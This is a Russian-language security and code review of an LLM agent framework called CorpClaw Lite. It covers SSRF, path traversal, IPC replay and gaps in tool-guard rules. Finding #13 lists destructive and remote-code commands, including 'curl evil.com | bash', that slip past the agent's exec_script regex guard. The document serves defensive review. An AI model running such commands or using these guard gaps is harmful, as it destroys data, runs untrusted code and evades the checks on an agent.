# Code Review: CorpClaw Lite — После Phase 7

**Дата:** 23 марта 2026
**Обновлено:** 10 апреля 2026
**Ревьюер:** Claude Opus 4.6 (4 параллельных ревью-агента + ручная верификация)
**Коммит:** 8d4a54c (Phase 7 complete)
**Статус кода:** 596 тестов, 0 pyright errors, 0 ruff errors

## Сводная таблица статусов (обновлено 2026-04-10)

| # | Finding | Severity | Статус |
|---|---------|----------|--------|
| 1 | Двойной assistant message | CRITICAL | ✅ Исправлено |
| 2 | SSRF DNS rebinding | CRITICAL | ✅ Исправлено |
| 3 | Environment merge TypeError | CRITICAL | ✅ Исправлено |
| 4 | Plugin path traversal (skill/tool) | CRITICAL | ⚠️ Частично (script component без проверки) |
| 5 | IPC nonce replay (container side) | HIGH | 🔵 By design (one-shot worker) |
| 6 | IPC future timestamps | HIGH | ✅ Исправлено |
| 7 | `_tools` private access | HIGH | ✅ Исправлено |
| 8 | Sync I/O в async (3 места) | HIGH | ✅ Исправлено |
| 9 | HTML injection Telegram | HIGH | ✅ Исправлено |
| 10 | SQLite WAL mode | HIGH | ✅ Исправлено |
| 11 | Loop detection break scope | HIGH | ✅ Исправлено |
| 12 | ToolGuard rules coverage | HIGH | ⚠️ Частично (send_file, normalize_excel без PATH_TRAVERSAL) |
| 13 | exec_script regex bypass | MEDIUM | ⚠️ Частично (улучшено, но regex-подход ограничен) |
| 14 | `path=None` default bypass | MEDIUM | ✅ Исправлено |
| 15 | Content-Length crash | MEDIUM | ✅ Исправлено |
| 16 | Нет LLM timeout | MEDIUM | ✅ Исправлено |
| 17 | MCP total timeout | MEDIUM | ✅ Исправлено |
| 18 | `completion_tokens` None | MEDIUM | ✅ Исправлено |
| 19 | History loses tool-calls | MEDIUM | 🔵 By design |
| 20 | HotReload blocking I/O | MEDIUM | ⚠️ Частично (anyio.Path, но loader sync) |
| 21 | Deleted skills not removed | MEDIUM | ✅ Исправлено |
| 22 | Mutable `Path.cwd()` | LOW | 🔵 Не исправлено (теоретический риск) |
| 23 | f-string logging | LOW | ✅ Исправлено |
| 24 | Health module-level state | LOW | 🔵 Приемлемо (reset_stats для тестов) |
| 25 | VectorMemory stubs | LOW | ✅ Файл удалён |
| 26 | PluginManifest type validation | LOW | 🔵 Не исправлено |

**Итого:** 17 исправлено, 3 частично, 4 not fixed (2 by design, 2 low), 1 файл удалён, 1 новый finding (script path traversal).

---

## Методология

Первичный анализ проведён 4 параллельными ревью-агентами (agent core, tools+security, channels+infra, extensions+LLM). Каждая находка затем **вручную верифицирована** по исходному коду с перепроверкой строк, типов и логики выполнения.

---

## CRITICAL — требуют исправления

### 1. Два последовательных assistant-сообщения при content + tool_calls
**`loop.py:109-112` + `context.py:27-47`**
**Верификация: ПОДТВЕРЖДЕНО**

Когда LLM возвращает и `content` и `tool_calls`, код создаёт **два** assistant-сообщения: одно с текстом (`add_assistant_message`, строка 110), второе с `content: None` + tool_calls (`add_tool_calls`, строка 112). OpenAI API требует единое assistant-сообщение. Большинство провайдеров отклонят или неправильно интерпретируют два подряд `role: "assistant"`.

**Исправление:** `add_tool_calls` должен принимать опциональный `content` и объединять в одно сообщение. В `loop.py` заменить строки 109-112 на `context.add_tool_calls(response.tool_calls, content=response.content)`.

### 2. SSRF через DNS rebinding в `web.py`
**`web.py:132` → `web.py:149`**
**Верификация: ПОДТВЕРЖДЕНО**

`_dns_check(hostname)` на строке 132 резолвит DNS и проверяет IP. Затем `client.get(current_url)` на строке 149 резолвит hostname **повторно** через httpx. Между двумя резолюциями атакующий DNS-сервер может вернуть приватный IP (169.254.169.254). Классическая TOCTOU-атака.

**Исправление:** Резолвить IP один раз, подставлять его в URL напрямую, а hostname передавать через `Host` header.

### 3. Environment merge-баг в `ContainerPolicies`
**`policies.py:39-47`**
**Верификация: ПОДТВЕРЖДЕНО — вызовет TypeError при использовании NetworkPolicy**

`args.update(net_args)` на строке 41 **перезаписывает** `args["environment"]` (dict `{"CORPCLAW_USER_ID": "..."}`) на `net_args["environment"]` (list `["ALLOWED_DOMAINS=..."]`). После строки 41 `args["environment"]` — уже list. Строка 47 делает `args["environment"][k] = v` — но на list это TypeError. Даже если бы не было TypeError, `CORPCLAW_USER_ID` уже потеряна при `update()`.

**Исправление:** Обработать environment отдельно ДО `update()`:
```python
if network_policy:
    net_args = network_policy.to_docker_args()
    if "environment" in net_args:
        for env_var in net_args.pop("environment"):
            k, v = env_var.split("=", 1)
            args["environment"][k] = v
    args.update(net_args)
```

### 4. Плагины: path traversal при загрузке tool.py и skill.md
**`plugins/loader.py:62,76`**
**Верификация: ПОДТВЕРЖДЕНО**

`manifest.components.get("skill")` / `"tool"` берётся из YAML и конкатенируется с `plugin_dir` без проверки: `skill_path = plugin_dir / skill_filename` (строка 62), `tool_path = plugin_dir / tool_filename` (строка 76). Если `skill_filename = "../../etc/passwd"` — файл за пределами директории плагина будет прочитан/выполнен. Для `tool_filename` это особенно критично — `exec_module()` на строке 85 **выполнит произвольный Python**.

**Исправление:** После вычисления пути проверить `tool_path.resolve().is_relative_to(plugin_dir.resolve())`.

---

## HIGH — важные баги и уязвимости

### 5. IPC nonce replay-protection не работает на стороне контейнера
**`ipc_auth.py` + `agent_worker.py`**
**Верификация: ПОДТВЕРЖДЕНО с уточнением**

`agent_worker.py:63` и строка 91 — создаётся **свежий** `IPCAuth()` с пустым `_seen_nonces`. Worker — one-shot процесс (stdin → process → stdout → exit). Nonce tracking бесполезен на стороне контейнера.

**Уточнение:** На **хост-стороне** `ContainerIPC` IPCAuth живёт дольше — nonce tracking работает для защиты от replay ответов контейнера. Проблема — только направление хост → контейнер: перехваченный запрос к контейнеру можно воспроизвести.

### 6. IPC принимает timestamps из будущего
**`ipc_auth.py:67`**
**Верификация: ПОДТВЕРЖДЕНО**

`if now - timestamp > self.nonce_ttl` — если `timestamp = now + 3600`, то `now - timestamp = -3600 < 300 (nonce_ttl)`. Проверка проходит.

**Исправление:** `if abs(now - timestamp) > self.nonce_ttl`.

### 7. `subagent.py:43` — доступ к приватному `_tools`
**`subagent.py:43`**
**Верификация: ПОДТВЕРЖДЕНО**

```python
for tool_name, tool in self._main_registry._tools.items():  # type: ignore[attr-defined]
```

Нарушение инкапсуляции. `ToolRegistry` имеет публичный `list_all()` (строка 27 registry.py), возвращающий `list[Tool]`, у каждого есть `.name`.

**Исправление:**
```python
for tool in self._main_registry.list_all():
    if "*" in spec.allowed_tools or tool.name in spec.allowed_tools:
        isolated_registry.register(tool)
```

### 8. Синхронный файловый I/O в async-контексте
**Верификация: ПОДТВЕРЖДЕНО для всех 3 мест**

- `vision.py:41` — `path.read_bytes()` — синхронный, блокирует event loop
- `subagent.py:54` — `prompt_file.read_text()` — синхронный, блокирует event loop
- `telegram_channel.py:80` — `with open(path, "rb")` — синхронный, блокирует event loop

CLAUDE.md требует `anyio` для файловых операций. Для крупных файлов (изображения) блокировка event loop существенна.

### 9. HTML injection в Telegram approval и send_message
**`telegram_channel.py:105` и `telegram_channel.py:69`**
**Верификация: ПОДТВЕРЖДЕНО**

Строка 105 — `action` и `details` вставляются в HTML без `html.escape()`:
```python
text=f"<b>⚠️ Approval Required</b>\n\n<b>Action:</b> {action}\n\n<i>{details}</i>"
```
Строка 69 — `send_message` отправляет `text` с `parse_mode=ParseMode.HTML` без экранирования. Если LLM-ответ содержит `<` или HTML-теги, Telegram может исказить форматирование или скрыть текст.

**Исправление:** `html.escape(action)`, `html.escape(details)` в request_approval; экранирование или `parse_mode=None` в send_message.

### 10. SQLite без WAL mode — `database is locked` при конкурентном доступе
**`memory/sqlite.py`, `users/manager.py`**
**Верификация: ПОДТВЕРЖДЕНО**

`sqlite.py` — каждый метод (`add_message`, `get_history`, `store_fact`, `recall_facts`, `clear`, `clear_facts`) открывает **новое** `sqlite3.connect()`. Нет `PRAGMA journal_mode=WAL`. При конкурентных запросах от нескольких Telegram-пользователей — `OperationalError: database is locked`. `users/manager.py` — аналогичная проблема.

**Исправление:** Добавить `conn.execute("PRAGMA journal_mode=WAL")` в `_init_db()` или после каждого `connect()`.

### 11. Loop detection `break` не останавливает ReAct loop
**`loop.py:155-161`**
**Верификация: ПОДТВЕРЖДЕНО**

`break` на строке 161 выходит из `for tc in response.tool_calls` (строка 116), не из `while True` (строка 92). На следующей итерации: `budget.check()` → `provider.chat()` → LLM может вызвать тот же инструмент снова. ProgressGuard лишь вставляет warning-сообщение в контекст.

**Уточнение:** Это частично by-design (warning nudge для LLM). BudgetGuard — единственный принудительный стоп. Однако при зацикливании тратится весь бюджет впустую вместо раннего выхода.

### 12. ToolGuard правила — неполное покрытие
**`tool_guard_rules.yaml`**
**Верификация: ПОДТВЕРЖДЕНО — два отдельных бага**

**12a. PATH_TRAVERSAL** (строка 14): `tool: "read_file"` — не покрывает `write_file`, `edit_file`, `normalize_excel`, `send_file`. Кодовая защита `resolve_and_validate_path()` работает для всех файловых инструментов, поэтому это баг defense-in-depth конфигурации, не уязвимость.

**12b. SECRET_IN_ARGS** (строки 23-27): `tool: "*"` + `match_param: "script"` — правило срабатывает только если у инструмента есть параметр `script`. Для `write_file` (параметр `content`), `memory_store` (параметр `value`), `web_fetch` (параметр `url`) — не сработает. `GuardRule.evaluate()` на строке 57 tool_guard.py — `arguments.get("script")` для инструментов без `script` вернёт `None`.

---

## MEDIUM

### 13. `exec_script` regex обходится тривиально
**`tool_guard_rules.yaml:8`**
**Верификация: ПОДТВЕРЖДЕНО**

Паттерн `rm\s+-rf\s+/`:
- `rm -rf /*` → **ловит** (содержит подстроку `rm -rf /`)
- `bash -c 'rm -rf /'` → **ловит**
- `rm -r -f /` → **НЕ ловит** (нет `-rf` как единого флага)
- `rm --no-preserve-root -rf /` → **НЕ ловит**
- `find / -delete` → **НЕ ловит**
- `curl evil.com | bash` → **НЕ ловит**

Regex — слабая первая линия. `exec_script` по дизайну HIGH risk и должен быть доступен только через `"*"` wildcard (engineering).

### 14. `ListFilesTool` — `path=None` обходит default
**`files.py:144`**
**Верификация: ПОДТВЕРЖДЕНО**

`kwargs.get("path", ".")` вернёт `None` если LLM передаст `{"path": null}` (ключ есть, default не используется). `resolve_and_validate_path(None)` → `Path(None)` → `TypeError` → пойман generic `except Exception` → непонятное сообщение об ошибке.

**Исправление:** `path = kwargs.get("path") or "."`.

### 15. `web.py:185` — `int(content_length)` crash на нечисловых значениях
**Верификация: ПОДТВЕРЖДЕНО**

Non-numeric `Content-Length` header → `ValueError` → поднимается из `_fetch()` → поймана на строке 141 → `"Error fetching '...': ..."`. Не crash процесса, но size check обойдён и response body загружается полностью в память.

### 16. Нет timeout на LLM вызов
**`loop.py:96-99`**
**Верификация: ПОДТВЕРЖДЕНО с уточнением**

`await self._provider.chat(...)` без `asyncio.wait_for()`. OpenAI/Anthropic SDK имеют свои internal timeouts (обычно 60-600с). Для локальных LLM через Ollama/vLLM — зависит от настроек. Реальный риск выше для локальных моделей, которые являются primary target проекта.

### 17. MCP client: per-line timeout, нет total timeout
**`mcp/client.py:134-145`**
**Верификация: ПОДТВЕРЖДЕНО**

`while True` с `asyncio.wait_for(readline(), timeout=self._timeout)` на каждую строку. Если MCP-сервер шлёт бесконечные нотификации (строки с `id != req_id`), цикл не завершится. Total wait не ограничен.

### 18. `OpenAIProvider.chat` — `completion_tokens` может быть `None`
**`openai.py:79`**
**Верификация: ПОДТВЕРЖДЕНО (маловероятный edge case)**

`response.usage.completion_tokens` типизирован как `int | None` в OpenAI SDK. `LLMResponse.usage` — `dict[str, int]`. Pydantic v2 при `LLMResponse(usage={"output_tokens": None})` может пропустить `None`. На практике OpenAI SDK почти всегда возвращает `completion_tokens` при non-streaming запросах.

### 19. История теряет tool-calls между разговорами
**`context.py:79-83` + `sqlite.py:62-71`**
**Верификация: ПОДТВЕРЖДЕНО — осознанное упрощение, не баг**

`sqlite.py:add_message()` сохраняет только `(user_id, role, content)` — tool_calls и tool results не сохраняются. `context.py:build_initial()` обрабатывает только `user`/`assistant`. Это текущий дизайн упрощённой памяти. LLM получает неполную историю, но это ожидаемо для Phase 7.

### 20. `SkillHotReloader._scan` — blocking I/O
**`watcher.py:62`**
**Верификация: ПОДТВЕРЖДЕНО (минимальный импакт)**

`glob()`, `stat()`, `read_text()` — синхронные вызовы внутри `async def _scan()`. Для типичного каталога skills (5-20 файлов) задержка <1ms. Нарушает async-first принцип, но практический импакт минимален.

### 21. Удалённые skills не убираются из реестра
**`watcher.py:57-75`**
**Верификация: ПОДТВЕРЖДЕНО**

`_scan()` проходит по `current_files` и обновляет `_mtimes`, но **нет** кода сравнивающего `self._mtimes` с `current_files` для обнаружения удалений. Удалённый skill файл навсегда остаётся в `_mtimes` и `_registry`.

---

## LOW

### 22. `resolve_and_validate_path` использует `Path.cwd()` — mutable global state
**`files.py:18`**
**Верификация: ПОДТВЕРЖДЕНО (теоретический риск)**

`Path.cwd()` вызывается при каждом использовании. В текущем коде нет `os.chdir()` нигде. `exec_script.py:45` использует `create_subprocess_shell` (подпроцесс, не `os.chdir()`). Станет проблемой только если кто-то добавит `os.chdir()`.

### 23. f-string в logging calls
**Верификация: ПОДТВЕРЖДЕНО**

Файлы: `departments/manager.py:41,52`, `plugins/loader.py:40,52,97`, `container/manager.py` — `logger.info(f"...")`, `logger.error(f"...")`. Строка форматируется всегда, даже если уровень логирования отключён. Minor performance issue.

### 24. Health module — module-level mutable state
**`health.py:8-9`**
**Верификация: ПОДТВЕРЖДЕНО**

`_start_time` и `_counters` — модульные глобалы. Работает для single-process. Затрудняет тестирование (state leaks). Ожидаемо для текущей стадии.

### 25. `VectorMemory` методы с пустыми телами
**`vector.py:19-21`**
**Верификация: ПОДТВЕРЖДЕНО — ожидаемый stub**

`add_fact` имеет только `# TODO` комментарий. Это заведомый stub, помеченный TODO. Вызывающий код не получит ошибку при вызове.

### 26. `PluginManifest.type` не валидируется runtime
**`plugins/base.py:21` + `plugins/loader.py:32`**
**Верификация: ПОДТВЕРЖДЕНО**

`type: ExtensionType` (Literal), но `PluginManifest` — `@dataclass(frozen=True)`, не Pydantic model. `data.get("type", "plugin")` возвращает `Any` из YAML. Dataclass не проверяет Literal-типы в runtime.

---

## Ранее заявленные, но пересмотренные

### Бывший #3: ToolGuard PATH_TRAVERSAL — только для `read_file`
**Первоначально: CRITICAL → Понижено: часть #12 (HIGH)**

Кодовая защита `resolve_and_validate_path()` работает для ВСЕХ файловых инструментов (`read_file`, `write_file`, `edit_file`, `list_files`, `search_files`, `normalize_excel`). ToolGuard — дополнительный слой defense-in-depth. Неполная конфигурация — баг, но не уязвимость.

### Бывший #4: `ToolRegistry.execute` глотает исключения
**Первоначально: CRITICAL → Понижено: LOW (не актуально в текущей архитектуре)**

В `loop.py:128-129` `ToolGuard.check()` вызывается **до** `registry.execute()`. `ApprovalRequest` и `ToolGuardError` перехватываются на строках 133 и 147 **до** попадания в `registry.execute()`. Ни один код не вызывает `check()` внутри `execute()`. Проблема теоретическая — возникнет только при рефакторинге.

---

## Соответствие дизайн-документу

| Требование дизайна | Статус | Замечание |
|---|---|---|
| Simple ReAct Loop (без LLM-planning) | ✅ | Реализовано корректно |
| SimpleBudgetGuard + SimpleProgressGuard | ⚠️ | ProgressGuard не форсирует остановку (#11) |
| Субагенты — изолированные исполнители | ✅ | Работает, но `_tools` доступ (#7) |
| read_image — отдельный LLM-вызов | ✅ | VisionProcessor корректен |
| ToolGuard (YAML rules, CoPaw pattern) | ⚠️ | PATH_TRAVERSAL неполный, SECRET_IN_ARGS сломан (#12) |
| IPC Auth: HMAC + nonce, mandatory | ⚠️ | Nonce replay не работает на стороне контейнера (#5) |
| NetworkPolicy enforcement | ⚠️ | Только env var, нет реального iptables enforcement |
| HotReload skills | ⚠️ | Удалённые skills не убираются из реестра (#21) |
| Tool: 5 атрибутов, не 18 | ✅ | Строго соблюдено |
| Skill: 6 атрибутов | ✅ | Строго соблюдено |
| Coverage ≥ 80% | ✅ | 80% достигнуто |
| pyright strict 0 errors | ✅ | Соблюдено |

---

## Приоритет исправлений

### Tier 1 — блокеры (сломают runtime)
1. **#1** — Двойной assistant message (сломает LLM API)
2. **#3** — Environment merge TypeError (контейнеры не запустятся с NetworkPolicy)
3. **#9** — HTML injection в Telegram (искажение approval-сообщений)
4. **#10** — SQLite WAL mode (database locked под нагрузкой)

### Tier 2 — безопасность
5. **#2** — SSRF DNS rebinding
6. **#4** — Plugin path traversal (code execution)
7. **#6** — IPC future timestamps
8. **#12** — ToolGuard rules: PATH_TRAVERSAL + SECRET_IN_ARGS
9. **#13** — exec_script regex bypass

### Tier 3 — качество кода
10. **#7** — `_tools` private access → public API
11. **#8** — Sync I/O в async (3 места)
12. **#11** — Loop detection break → proper exit
13. **#14** — `path=None` default
14. **#16** — LLM timeout
15. **#17** — MCP total timeout
16. **#21** — HotReload deleted skills

### Не требуют исправления (by-design / stubs)
- **#19** — Упрощённая память (текущий дизайн)
- **#24** — Health global state (single-process)
- **#25** — VectorMemory stub (TODO)

---

## Статистика верификации

| Результат | Количество |
|---|---|
| Подтверждено без изменений | 22 |
| Подтверждено с уточнением | 4 (#5, #11, #16, #19) |
| Понижено в severity | 2 (бывшие #3 → #12, бывший #4 → LOW) |
| Опровергнуто | 0 |
| **Итого находок** | **26 (перенумерованы)** |
